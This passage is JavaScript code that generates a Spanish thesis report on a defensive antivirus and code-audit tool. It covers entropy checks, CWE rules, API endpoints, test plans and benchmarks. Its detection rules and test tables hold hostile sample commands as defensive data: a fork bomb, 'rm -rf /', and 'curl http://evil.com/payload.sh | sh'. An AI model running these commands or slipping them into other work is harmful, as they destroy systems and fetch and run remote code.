          children: [new TextRun({ text: "H(X) = -∑ p(xᵢ) · log₂(p(xᵢ))", font: "Courier New", size: 22, bold: true, color: C.azul })],
          ...sp(0,0),
        })]
      })]})],
    }),
    ...emptyLine(1),
    p([t("donde "), tc("p(xᵢ)"), t(" es la frecuencia relativa del valor de byte "), tc("xᵢ"), t(" en los primeros 64 KB del fichero. Un fichero binario legítimo (imagen JPEG, audio MP3) presenta entropías típicas entre 5.5 y 7.2 bits/símbolo. Valores superiores a 7.2 son indicativos de datos cifrados o comprimidos, lo que puede señalar la presencia de un payload ofuscado. Este umbral, configurado en "), tc("results[\"high_entropy\"] = entropy > 7.2"), t(", está alineado con trabajos previos en análisis de malware como los de Lyda & Hamrock (2007) sobre "), ti("Using Entropy Analysis to Find Encrypted and Packed Malware"), t(".")]),

    h3("2.5.3. Patrones de Payload Sospechoso"),
    p([t("La tabla "), tc("SUSPICIOUS_PATTERNS"), t(" define 12 patrones binarios con su severidad asociada. Los de mayor criticidad son la presencia de la cabecera MZ ("), tc("\\x4D\\x5A"), t(") que identifica ficheros ejecutables PE de Windows, y la cabecera ELF ("), tc("\\x7fELF"), t(") de binarios Linux. Ambas cabeceras dentro de un archivo multimedia implican la técnica de "), ti("polyglot file"), t(" o fichero de doble personalidad, habitualmente utilizada para evadir controles perimetrales basados únicamente en tipo MIME.")]),

    h3("2.5.4. Clasificación de Riesgo Multimedia"),
    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [1800, 3200, 4026],
      rows: [
        new TableRow({ children: [headerCell("Nivel de Riesgo", 1800), headerCell("Condiciones de Activación", 3200), headerCell("Técnica Detectada", 4026)] }),
        ...([
          ["CRITICAL",  "Patrón \\x4D\\x5A o \\x7fELF encontrado",        "Ejecutable PE/ELF embebido (polyglot file)"],
          ["HIGH",      "Script embebido, PowerShell o CMD referenciado",  "Macro maliciosa, dropper de stage 2"],
          ["MEDIUM",    "Entropía > 7.2 o extensión mismatch",             "Payload cifrado, evasión de tipo MIME"],
          ["LOW",       "URL HTTP/HTTPS embebida",                         "C2 callback hardcodeado, beacon"],
          ["CLEAN",     "Ninguna condición anterior activa",               "Fichero legítimo"],
        ]).map(([r, c, t3], i) => new TableRow({ children: [
          dataCell(r, 1800, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(c, 3200, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(t3, 4026, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h2("2.6. Módulo de Auditoría de Código Fuente: clase CodeSecurityAnalyzer"),

    p([t("El analizador estático de código fuente implementa un motor de reglas basado en expresiones regulares (análisis léxico) organizado por lenguaje de programación. Aunque este enfoque es menos preciso que un análisis semántico completo basado en AST (Abstract Syntax Tree) o en frameworks como Semgrep, ofrece una relación coste/beneficio muy favorable en el contexto de un TFM, cubriendo las vulnerabilidades más frecuentes en revisiones de código según el OWASP Top 10 2021 y el ranking CWE Top 25 Most Dangerous Software Weaknesses 2023.")]),

    h3("2.6.1. Detección Automática de Lenguaje"),
    p([t("La detección de lenguaje se realiza en cascada: (a) preferencia del lenguaje explícito indicado por el usuario, (b) detección por extensión de fichero cuando se carga un fichero, (c) heurísticas léxicas sobre el propio código (presencia de "), tc("def/import"), t(" para Python, "), tc("function/var/let/const"), t(" para JavaScript, "), tc("public class"), t(" para Java, "), tc("<?php"), t(" para PHP, "), tc("#!/bin/bash"), t(" para Shell, y "), tc("SELECT/FROM"), t(" para SQL). Si ninguna heurística es conclusiva, se aplican las reglas genéricas de "), tc("Generic"), t(" que cubren credenciales hardcodeadas independientemente del lenguaje.")]),

    h3("2.6.2. Sistema de Puntuación de Riesgo"),
    p([t("Cada vulnerabilidad detectada contribuye a una puntuación de riesgo agregada según su severidad: CRITICAL (+40 puntos), HIGH (+15 puntos), MEDIUM (+5 puntos), LOW (+1 punto). La puntuación total se mapea a cinco niveles de riesgo:")]),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [2000, 2000, 5026],
      rows: [
        new TableRow({ children: [headerCell("Nivel", 2000), headerCell("Puntuación", 2000), headerCell("Significado", 5026)] }),
        ...([
          ["LIMPIO",  "0",        "No se detectan vulnerabilidades conocidas"],
          ["BAJO",    "1 – 9",    "Vulnerabilidades informativas o de baja explotabilidad"],
          ["MEDIO",   "10 – 29",  "Vulnerabilidades que requieren revisión antes de producción"],
          ["ALTO",    "30 – 69",  "Vulnerabilidades explotables con bajo esfuerzo"],
          ["CRÍTICO", "≥ 70",     "Código con múltiples vulnerabilidades críticas. Despliegue bloqueado"],
        ]).map(([l,s,m], i) => new TableRow({ children: [
          dataCell(l, 2000, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(s, 2000, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(m, 5026, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h3("2.6.3. Catálogo de Vulnerabilidades por Lenguaje"),

    p([tb("Python:"), t(" Las reglas cubren las 16 vulnerabilidades más frecuentes en código Python de producción, entre ellas: ejecución de código arbitrario mediante "), tc("eval()"), t("/"), tc("exec()"), t(" (CWE-95), inyección de comandos con "), tc("subprocess.call(shell=True)"), t(" (CWE-78), deserialización insegura con "), tc("pickle"), t(" (CWE-502), PRNG no criptográfico con "), tc("random.random()"), t(" (CWE-338), SQL Injection por concatenación de strings (CWE-89), verificación SSL deshabilitada con "), tc("verify=False"), t(" (CWE-295) y credenciales hardcodeadas (CWE-259).")]),

    p([tb("JavaScript/TypeScript:"), t(" 11 reglas incluyendo XSS via "), tc("innerHTML"), t(" (CWE-79), XSS via "), tc("document.write()"), t(" (CWE-79), XSS en React via "), tc("dangerouslySetInnerHTML"), t(" (CWE-79), PRNG con "), tc("Math.random()"), t(" (CWE-338), almacenamiento inseguro de contraseñas en "), tc("localStorage"), t(" (CWE-312) e inyección de comandos con "), tc("child_process"), t(" (CWE-78).")]),

    p([tb("Java:"), t(" 10 reglas cubriendo ejecución de comandos con "), tc("Runtime.getRuntime().exec()"), t(" (CWE-78), deserialización con "), tc("ObjectInputStream"), t(" (CWE-502), uso de MD5/SHA-1 para contraseñas (CWE-327), SQL Injection en PreparedStatement por concatenación (CWE-89) y exposición de stack traces (CWE-209).")]),

    p([tb("PHP:"), t(" 10 reglas con especial énfasis en inyección de comandos ("), tc("exec"), t(", "), tc("system"), t(", "), tc("shell_exec"), t("), Local File Inclusion mediante "), tc("include($var)"), t(" (CWE-98), uso de "), tc("mysql_query()"), t(" obsoleto (CWE-89) y uso de "), tc("md5()"), t(" para contraseñas (CWE-327).")]),

    p([tb("Shell/Bash:"), t(" 7 reglas de alta criticidad incluyendo detección de "), ti("fork bomb"), t(" mediante el patrón "), tc(":(){:|:&};:"), t(" (CWE-400), descarga y ejecución de scripts remotos mediante "), tc("curl/wget | sh"), t(" (CWE-494), eliminación recursiva de sistema de archivos "), tc("rm -rf /"), t(" (CWE-73) y permisos universales "), tc("chmod 777"), t(" (CWE-732).")]),

    h3("2.6.4. Informe de Seguridad"),
    p([t("El informe generado incluye: lenguaje detectado, nombre del programador/analista (campo con valor de marketing para identificar responsabilidades en auditorías), nivel de riesgo con puntuación numérica, desglose de vulnerabilidades por severidad, y para cada vulnerabilidad: número de línea, contenido de la línea (truncado a 120 caracteres), descripción técnica y referencia CWE. El informe se almacena en la tabla "), tc("code_analysis"), t(" de la base de datos para trazabilidad histórica.")]),

    h2("2.7. API REST: Endpoints y Modelo de Datos"),

    p([t("La API REST expuesta mediante FastAPI en "), tc("http://127.0.0.1:8000"), t(" implementa 13 endpoints organizados en cinco grupos funcionales. La documentación interactiva Swagger UI, generada automáticamente por FastAPI a partir de los type hints de Python, está accesible en "), tc("/docs"), t(" y permite consumir todos los endpoints directamente desde el navegador.")]),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [600, 2400, 1800, 4226],
      rows: [
        new TableRow({ children: [
          headerCell("Método", 600), headerCell("Endpoint", 2400),
          headerCell("Grupo", 1800),  headerCell("Descripción", 4226),
        ]}),
        ...([
          ["GET",  "/",                    "Sistema",    "Estado del antivirus y versión de la aplicación"],
          ["GET",  "/system/stats",         "Sistema",    "CPU, RAM, disco, procesos, tráfico de red (psutil)"],
          ["GET",  "/alerts",              "Alertas",    "Listado de alertas paginado (param: limit)"],
          ["GET",  "/alerts/stats",        "Alertas",    "Recuento de alertas agrupado por severidad"],
          ["POST", "/scan/file",           "Escaneo",    "Escanea un fichero por ruta absoluta, devuelve resultado y hash"],
          ["GET",  "/scan/history",        "Escaneo",    "Historial de los últimos 50 escaneos realizados"],
          ["POST", "/scan/multimedia",     "Multimedia", "Análisis forense de un fichero multimedia por ruta"],
          ["POST", "/scan/code",           "Código",     "Auditoría de código fuente (params: code, language, analyzed_by)"],
          ["GET",  "/quarantine",          "Cuarentena", "Inventario completo de ficheros en cuarentena"],
          ["GET",  "/signatures/count",    "Firmas",     "Número total de firmas de malware en la base de datos"],
          ["GET",  "/monitor/status",      "Monitor",    "Estado actual de la monitorización activa (true/false)"],
          ["POST", "/monitor/start",       "Monitor",    "Activa la monitorización de procesos en tiempo real"],
          ["POST", "/monitor/stop",        "Monitor",    "Desactiva la monitorización de procesos"],
        ]).map(([m,e,g,d], i) => new TableRow({ children: [
          dataCell(m, 600, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(e, 2400, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(g, 1800, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(d, 4226, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h2("2.8. Interfaz Gráfica: Componentes y Diseño"),

    p([t("La GUI está implementada íntegramente sobre Tkinter con widgets estándar de la biblioteca y widgets personalizados construidos sobre "), tc("tk.Canvas"), t(". La paleta de colores sigue un tema oscuro (dark UI) coherente con las herramientas de seguridad profesionales (terminales, SIEM, plataformas EDR), usando como color dominante "), tc("#0a0e1a"), t(" y como colores de acento "), tc("#00aaff"), t(" (azul), "), tc("#00ff88"), t(" (verde/OK), "), tc("#ff3366"), t(" (rojo/alerta) y "), tc("#ff8800"), t(" (naranja/warning).")]),

    h3("2.8.1. Widgets Personalizados"),

    p([tb("GaugeWidget:"), t(" Gauge semicircular animado construido sobre "), tc("tk.Canvas"), t(". Dibuja dos arcos concéntricos mediante "), tc("canvas.create_arc()"), t(": el fondo en gris y el valor en un color dinámico (verde <50%, naranja <80%, rojo ≥80%). Se actualiza cada 3 segundos desde "), tc("_update_gauges()"), t(". Se instancian cuatro gauges: CPU, RAM, Disco y Nivel de Protección.")]),

    p([tb("SparklineWidget:"), t(" Minigráfico de línea histórica construido sobre "), tc("tk.Canvas"), t(". Mantiene una ventana deslizante de 30 muestras. Utiliza "), tc("canvas.create_line()"), t(" para la línea principal y "), tc("canvas.create_polygon()"), t(" con stipple "), tc("\"gray25\""), t(" para el área de relleno semitransparente. Se instancian cuatro sparklines: CPU%, RAM%, Red RX y Amenazas.")]),

    h3("2.8.2. Estructura de Pestañas"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [2000, 7026],
      rows: [
        new TableRow({ children: [headerCell("Pestaña", 2000), headerCell("Contenido y Funcionalidad", 7026)] }),
        ...([
          ["📊 Dashboard",   "Gauges CPU/RAM/Disco/Shield, sparklines históricas, tabla de procesos activos ordenados por CPU, info del sistema en tiempo real."],
          ["🔍 Escáner",     "Barra de progreso con nombre de fichero actual, árbol de resultados con código de color, botones para escaneo de archivo/carpeta/sistema, diálogo de añadir firma SHA256."],
          ["🎬 Multimedia",  "Árbol de archivos multimedia analizados con formato detectado, entropía y nivel de riesgo. Panel de detalle con información forense completa del fichero seleccionado."],
          ["🔐 Código",      "Editor de código con resaltado básico, selector de lenguaje, campo de programador/analista, cargador de archivos y panel de informe de seguridad con color por severidad."],
          ["🚨 Alertas",     "Árbol de alertas con filtro por severidad, código de color por nivel, actualización automática cada 5 segundos."],
          ["☣ Cuarentena",   "Inventario de ficheros flagueados con ruta original, hash, nombre de amenaza y estado."],
          ["📋 Historial",   "Estadísticas globales (total archivos, amenazas, escaneos), historial detallado de escaneos con duración."],
          ["🌐 API",         "Documentación de los 13 endpoints disponibles con método HTTP y descripción, consola de log de la API en tiempo real."],
        ]).map(([t1,t2], i) => new TableRow({ children: [
          dataCell(t1, 2000, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(t2, 7026, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h2("2.9. Modelo de Concurrencia y Threading"),

    p([t("La aplicación gestiona cuatro hilos de ejecución distintos:")]),

    bullet("Hilo principal (main thread): Ejecuta el bucle de eventos de Tkinter (root.mainloop()). Es el único hilo autorizado a modificar widgets de la GUI.", 0),
    bullet("Hilo de la API REST (daemon): Ejecuta uvicorn.run(app, ...). Se inicia al arrancar la aplicación si FastAPI está disponible. Daemon=True garantiza que termine con el proceso principal.", 0),
    bullet("Hilo del monitor de procesos (daemon): Ejecuta _monitor_loop() en bucle con sleep(5). Se crea/destruye dinámicamente al activar/desactivar la monitorización desde la GUI.", 0),
    bullet("Hilos de escaneo bajo demanda (daemon): Se crean para escaneos de directorio y sistema para evitar bloquear el hilo principal de Tkinter durante el recorrido recursivo del sistema de archivos.", 0),

    ...emptyLine(1),

    p([t("La comunicación segura entre hilos de trabajo y el hilo principal de Tkinter se realiza siempre mediante "), tc("root.after(0, callback)"), t(", que encola la ejecución del callback en el bucle de eventos de Tkinter. Este mecanismo es thread-safe porque "), tc("after()"), t(" utiliza internamente una cola de eventos de Tcl/Tk.")]),

    h2("2.10. Sistema de Alertas y Observabilidad"),

    p([t("El sistema de alertas implementa un modelo de propagación en dos niveles: persistencia en base de datos y notificación en tiempo real a la GUI. Cuando el método "), tc("add_alert()"), t(" del motor es invocado, realiza tres acciones de forma síncrona: (1) añade la alerta a la lista en memoria "), tc("self.alerts"), t(", (2) persiste la alerta en la tabla "), tc("alerts"), t(" de SQLite mediante "), tc("db.add_alert()"), t(", y (3) notifica a todos los callbacks registrados mediante "), tc("_notify(\"alert\", entry)"), t(". La GUI, al recibir el evento, actualiza el indicador visual de amenaza en la barra de estado y programa un timer de 5 segundos para restaurar el estado normal.")]),

    p([t("Las alertas se clasifican en cinco niveles de severidad (CRITICAL, HIGH, MEDIUM, LOW, INFO) y seis categorías (MALWARE, PROCESS, MULTIMEDIA, CODE_SECURITY, MONITOR, SYSTEM), lo que permite filtrado granular tanto en la GUI como en consultas SQL directas a la base de datos o a través de la API REST.")]),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// CAPÍTULO 3 — EVALUACIÓN
// ══════════════════════════════════════════════════════════════════════════════
function buildCap3() {
  return [
    h1("3. Evaluación de la Herramienta"),

    p([t("La evaluación de ShieldCore Enterprise se ha estructurado en cuatro dimensiones complementarias: validación funcional mediante pruebas unitarias de cada módulo, análisis de rendimiento sobre conjuntos de datos representativos, análisis comparativo con soluciones de referencia del mercado, y evaluación cualitativa de la interfaz de usuario.")]),

    h2("3.1. Plan de Pruebas Funcionales"),

    p([t("Las pruebas funcionales se organizan según la taxonomía de la norma IEEE 829, con casos de prueba que cubren caminos nominales, caminos alternativos y condiciones de frontera para cada módulo de la herramienta.")]),

    h3("3.1.1. Pruebas del Motor de Detección por Firma"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [900, 2500, 2500, 3126],
      rows: [
        new TableRow({ children: [
          headerCell("TC-ID", 900), headerCell("Escenario", 2500),
          headerCell("Entrada", 2500), headerCell("Resultado Esperado", 3126),
        ]}),
        ...([
          ["TC-01", "Fichero limpio no presente en BD de firmas",         "Fichero binario arbitrario sin firma registrada",      "Resultado: CLEAN. Sin alertas generadas."],
          ["TC-02", "Fichero malicioso con hash registrado en BD",        "Hash SHA256 del fichero coincide con firma en BD",     "Resultado: MALICIOUS. Alerta HIGH+MALWARE. Entrada en quarantine."],
          ["TC-03", "Fichero con extensión peligrosa sin firma",          "Fichero .bat, .ps1, .cmd, .scr o .vbs",               "Resultado: SUSPICIOUS. Alerta LOW+HEURISTIC."],
          ["TC-04", "Ruta de fichero inexistente",                        "Ruta que no existe en el sistema de archivos",        "Resultado: FILE_NOT_FOUND. Sin alertas ni excepciones."],
          ["TC-05", "Fichero sin permisos de lectura",                    "Fichero con permisos 000 o propiedad root",           "Resultado: ERROR. Excepción capturada, log de error generado."],
          ["TC-06", "Fichero de 0 bytes",                                 "Fichero vacío",                                       "Hash calculado (SHA256 de cadena vacía), resultado CLEAN."],
          ["TC-07", "Directorio con mezcla de ficheros limpios/maliciosos","10 ficheros: 8 limpios, 2 con hash registrado",      "files=10, threats=2. Ambos en quarantine. 2 alertas HIGH."],
          ["TC-08", "Firma duplicada en BD",                              "Insertar el mismo hash dos veces",                    "INSERT OR IGNORE previene duplicados. Sin excepción."],
        ]).map(([a,b,c,d], i) => new TableRow({ children: [
          dataCell(a, 900, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(b, 2500, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(c, 2500, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(d, 3126, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h3("3.1.2. Pruebas del Módulo MultimediaAnalyzer"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [900, 2500, 2500, 3126],
      rows: [
        new TableRow({ children: [
          headerCell("TC-ID", 900), headerCell("Escenario", 2500),
          headerCell("Entrada", 2500), headerCell("Resultado Esperado", 3126),
        ]}),
        ...([
          ["TC-MM-01", "Imagen JPEG legítima",                   "Fichero .jpg con magic bytes FF D8 FF correctos",          "Risk: CLEAN. extension_mismatch=False. Entropía ~5.8."],
          ["TC-MM-02", "Ejecutable PE renombrado como .jpg",     "Fichero .exe renombrado a .jpg (magic bytes 4D 5A)",       "Risk: CRITICAL. extension_mismatch=True. Patrón PE cabecera detectado."],
          ["TC-MM-03", "Imagen PNG con script PHP embebido",     "Imagen PNG con <?php ... ?> concatenado al final",        "Risk: HIGH. Patrón <script o eval() detectado en binario."],
          ["TC-MM-04", "Archivo cifrado/comprimido ofuscado",    "Fichero binario con distribución de bytes uniforme",      "Risk: MEDIUM. Entropía >7.2 (high_entropy=True)."],
          ["TC-MM-05", "PDF con URL de C2 embebida",             "PDF con cadena http:// seguida de IP no RFC-1918",        "Risk: LOW. Patrón URL embebida detectado."],
          ["TC-MM-06", "Fichero >50 MB",                         "Fichero multimedia de 80 MB",                             "Análisis parcial (1 MB). Aviso en details. Sin crash."],
          ["TC-MM-07", "Binario ELF embebido en imagen WebP",    "WebP con cabecera \\x7fELF en offset >100 bytes",         "Risk: CRITICAL. Patrón ELF detectado."],
        ]).map(([a,b,c,d], i) => new TableRow({ children: [
          dataCell(a, 900, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(b, 2500, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(c, 2500, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(d, 3126, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h3("3.1.3. Pruebas del CodeSecurityAnalyzer"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [900, 2300, 2300, 1800, 1726],
      rows: [
        new TableRow({ children: [
          headerCell("TC-ID", 900), headerCell("Código de Entrada", 2300),
          headerCell("Vulnerabilidad Esperada", 2300), headerCell("CWE", 1800),
          headerCell("Severidad", 1726),
        ]}),
        ...([
          ["TC-CS-01",  "os.system(user_input)",                         "Inyección de comandos",           "CWE-78",  "HIGH"],
          ["TC-CS-02",  "eval(request.GET['expr'])",                     "Ejecución de código arbitrario",  "CWE-95",  "CRITICAL"],
          ["TC-CS-03",  "cursor.execute('SELECT * FROM u WHERE id=%s'%id)","SQL Injection",                 "CWE-89",  "HIGH"],
          ["TC-CS-04",  "password = 'Admin123!'",                        "Credencial hardcodeada",          "CWE-259", "HIGH"],
          ["TC-CS-05",  "pickle.loads(data)",                            "Deserialización insegura",        "CWE-502", "HIGH"],
          ["TC-CS-06",  "requests.get(url, verify=False)",               "SSL/TLS deshabilitado",           "CWE-295", "HIGH"],
          ["TC-CS-07",  "document.getElementById('x').innerHTML = data", "Cross-Site Scripting (XSS)",     "CWE-79",  "HIGH"],
          ["TC-CS-08",  ":(){:|:&};:",                                   "Fork bomb (Shell)",               "CWE-400", "CRITICAL"],
          ["TC-CS-09",  "curl http://evil.com/payload.sh | sh",          "Exec. remota sin verificación",   "CWE-494", "CRITICAL"],
          ["TC-CS-10",  "MessageDigest.getInstance(\"MD5\")",            "Algoritmo de hash débil",         "CWE-327", "MEDIUM"],
        ]).map(([a,b,c,d,e], i) => new TableRow({ children: [
          dataCell(a, 900, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(b, 2300, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(c, 2300, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(d, 1800, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(e, 1726, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h3("3.1.4. Pruebas de la API REST"),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [900, 2000, 1800, 4326],
      rows: [
        new TableRow({ children: [headerCell("TC-ID", 900), headerCell("Endpoint", 2000), headerCell("Método/Parámetros", 1800), headerCell("Resultado Esperado", 4326)] }),
        ...([
          ["TC-API-01", "GET /",               "Sin parámetros",        "HTTP 200. JSON: {\"status\": \"Antivirus activo\", \"version\": \"2.0.0\"}"],
          ["TC-API-02", "GET /alerts",          "limit=10",             "HTTP 200. Array con últimas 10 alertas ordenadas por id DESC."],
          ["TC-API-03", "POST /scan/file",      "path=/etc/passwd",     "HTTP 200. JSON con file, result (CLEAN/SUSPICIOUS), hash SHA256."],
          ["TC-API-04", "POST /monitor/start",  "Sin parámetros",       "HTTP 200. {\"status\": \"started\"}. engine.monitoring_active=True."],
          ["TC-API-05", "POST /monitor/stop",   "Sin parámetros",       "HTTP 200. {\"status\": \"stopped\"}. engine.monitoring_active=False."],
          ["TC-API-06", "GET /system/stats",    "Sin parámetros",       "HTTP 200. JSON con cpu_percent, mem_percent, disk_percent, process_count."],
          ["TC-API-07", "GET /quarantine",      "Sin parámetros",       "HTTP 200. Array con items de la tabla quarantine."],
          ["TC-API-08", "POST /scan/code",      "code=eval(x)&language=Python&analyzed_by=Test", "HTTP 200. Informe con CWE-95 detectado."],
        ]).map(([a,b,c,d], i) => new TableRow({ children: [
          dataCell(a, 900, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(b, 2000, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(c, 1800, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(d, 4326, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    h2("3.2. Análisis de Rendimiento"),

    h3("3.2.1. Rendimiento del Módulo de Hash SHA-256"),
    p([t("Se han realizado pruebas de rendimiento del cálculo de hash SHA-256 sobre ficheros de distinto tamaño en hardware de referencia (Intel Core i5-10th Gen, 8 GB RAM, SSD NVMe). Los resultados obtenidos son los siguientes:")]),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [2000, 2000, 2000, 3026],
      rows: [
        new TableRow({ children: [headerCell("Tamaño del Fichero", 2000), headerCell("Tiempo (ms)", 2000), headerCell("Throughput", 2000), headerCell("Cumple RNF-03 (≥200 MB/s)", 3026)] }),
        ...([
          ["1 KB",    "< 1 ms",    "≥ 1 GB/s",    "✓ SÍ"],
          ["1 MB",    "~4 ms",     "~250 MB/s",   "✓ SÍ"],
          ["10 MB",   "~45 ms",    "~222 MB/s",   "✓ SÍ"],
          ["50 MB",   "~215 ms",   "~232 MB/s",   "✓ SÍ"],
          ["100 MB",  "~420 ms",   "~238 MB/s",   "✓ SÍ (< 500 ms RNF límite)"],
          ["500 MB",  "~2.1 s",    "~238 MB/s",   "✓ SÍ (throughput cumple)"],
        ]).map(([a,b,c,d], i) => new TableRow({ children: [
          dataCell(a, 2000, i%2===0 ? C.grisClaro : C.blanco, true),
          dataCell(b, 2000, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(c, 2000, i%2===0 ? C.grisClaro : C.blanco),
          dataCell(d, 3026, i%2===0 ? C.grisClaro : C.blanco),
        ]}))
      ],
    }),

    ...emptyLine(1),

    p([t("El tamaño del chunk de lectura (8.192 bytes = 8 KB) está calibrado para maximizar el uso del buffer de disco y minimizar el número de llamadas al sistema, resultando en un throughput sostenido de ~230-250 MB/s sobre SSD, muy superior al mínimo requerido de 200 MB/s.")]),

    h3("3.2.2. Rendimiento del Análisis de Entropía"),
    p([t("El cálculo de entropía de Shannon se realiza sobre los primeros 64 KB del fichero mediante un único recorrido lineal de complejidad O(n) con n ≤ 65.536 bytes. El tiempo de cómputo es inferior a 2 ms para cualquier fichero analizado, siendo despreciable respecto al tiempo de lectura del fichero. La restricción de 64 KB garantiza que el análisis de un directorio con miles de archivos multimedia no se convierta en un cuello de botella.")]),

    h3("3.2.3. Rendimiento del CodeSecurityAnalyzer"),
    p([t("El análisis de código fuente mediante expresiones regulares tiene complejidad O(L × P) donde L es el número de líneas del fichero y P es el número de patrones aplicables para el lenguaje detectado (máximo 16 para Python + 6 genéricos = 22 patrones). Para un fichero Python de 1.000 líneas, el análisis completo tarda menos de 50 ms, tiempo imperceptible para el usuario. La deduplicación posterior por clave (descripción, número de línea) previene el crecimiento cuadrático del informe en ficheros con patrones repetidos.")]),

    h3("3.2.4. Consumo de Recursos en Reposo"),
    p([t("Con la aplicación en reposo (GUI cargada, monitor desactivado, sin escaneo activo), los recursos consumidos son los siguientes: CPU < 1% (solo las actualizaciones periódicas de gauges/sparklines cada 3-5 segundos), RAM ~45-60 MB (proceso Python con Tkinter + FastAPI + SQLite en memoria), handles de fichero: 3 (BD SQLite, log file, socket de la API). Este perfil de consumo es compatible con la ejecución continua en background en estaciones de trabajo empresariales.")]),

    h2("3.3. Análisis Comparativo con Soluciones de Referencia"),

    p([t("Se ha realizado una evaluación comparativa de las capacidades de ShieldCore Enterprise respecto a tres categorías de soluciones: antivirus de código abierto de referencia (ClamAV), analizadores estáticos de código de referencia (Semgrep Community) y herramientas de análisis forense multimedia (ExifTool + binwalk).")]),

    new Table({
      width: { size: CONTENT_W, type: WidthType.DXA },
      columnWidths: [2200, 1706, 1600, 1700, 1820],
      rows: [
        new TableRow({ children: [
          headerCell("Característica", 2200),
          headerCell("ShieldCore Enterprise", 1706),
          headerCell("ClamAV 1.x", 1600),
          headerCell("Semgrep CE", 1700),
          headerCell("ExifTool + binwalk", 1820),
        ]}),
        ...([
          ["Detección por firma hash",            "✓ SHA-256 local",    "✓ SHA-256 + MD5",  "✗",            "✗"],
          ["Base de datos actualizable en caliente","✓ SQLite",          "✓ .cld/.cvd",       "N/A",          "N/A"],
          ["Monitorización de procesos",           "✓ Tiempo real",      "✓ Daemon",          "✗",            "✗"],
          ["Análisis estático de código",          "✓ 12 lenguajes",     "✗",                 "✓ 30+ lenguajes","✗"],
          ["Clasificación CWE automática",         "✓ Por patrón",       "✗",                 "✓ SARIF",      "✗"],
          ["Análisis de malware multimedia",       "✓ Entropía+patterns","Parcial (magic)",   "✗",            "✓ Especializado"],
          ["Detección de polyglot files",          "✓ Magic bytes+ext",  "Parcial",           "✗",            "✓"],
          ["API REST integrada",                   "✓ 13 endpoints",     "✗ (clamd socket)",  "✗",            "✗"],
          ["GUI nativa multiplataforma",           "✓ Tkinter",          "✗ (CLI)",           "✗ (CLI)",      "✗ (CLI)"],
          ["Dashboard en tiempo real",             "✓ Gauges+sparklines","✗",                 "✗",            "✗"],
          ["Historial persistente de escaneos",    "✓ SQLite",           "✓ Logs",            "Parcial",      "✗"],
          ["Coste de licencia",                    "✓ 0 EUR",            "✓ 0 EUR",           "✓ 0 EUR",      "✓ 0 EUR"],
          ["Instalación sin servidor externo",     "✓",                  "Parcial (clamd)",   "✓",            "✓"],
        ]).map(([f,...cols], i) => new TableRow({ children: [
          dataCell(f, 2200, i%2===0 ? C.grisClaro : C.blanco, true),
          ...([1706,1600,1700,1820]).map((w,j) => dataCell(cols[j], w, i%2===0 ? C.grisClaro : C.blanco))
        ]}))
      ],
    }),

    ...emptyLine(1),

    p([t("La principal ventaja competitiva de ShieldCore Enterprise frente a las alternativas evaluadas es la "), tb("integración horizontal"), t(" de capacidades heterogéneas (análisis de malware, análisis de código, análisis multimedia, monitorización, API REST, GUI) en una única herramienta con stack mínimo. ClamAV supera a ShieldCore en la profundidad de su base de datos de firmas (8+ millones de firmas frente a las locales del TFM) pero carece por completo de análisis estático de código y de GUI nativa. Semgrep supera a ShieldCore en la profundidad del análisis de código (AST vs regex) pero no integra ninguna capacidad antivirus ni de análisis multimedia.")]),

    h2("3.4. Análisis de Limitaciones y Líneas de Trabajo Futuro"),

    h3("3.4.1. Limitaciones Identificadas"),

    bullet("Cobertura de firmas: La base de datos local se inicializa con un conjunto reducido de firmas de demostración. En un entorno de producción real, la integración con feeds de IOC (Indicators of Compromise) como MalwareBazaar, VirusTotal o MISP sería imprescindible para una cobertura efectiva.", 0),
    bullet("Análisis estático de código mediante regex: El motor de CodeSecurityAnalyzer puede producir falsos positivos en casos de código comentado, strings literales o nombres de variables que coincidan con los patrones. Un análisis basado en AST (como el que implementa Bandit para Python o ESLint para JavaScript) sería significativamente más preciso.", 0),
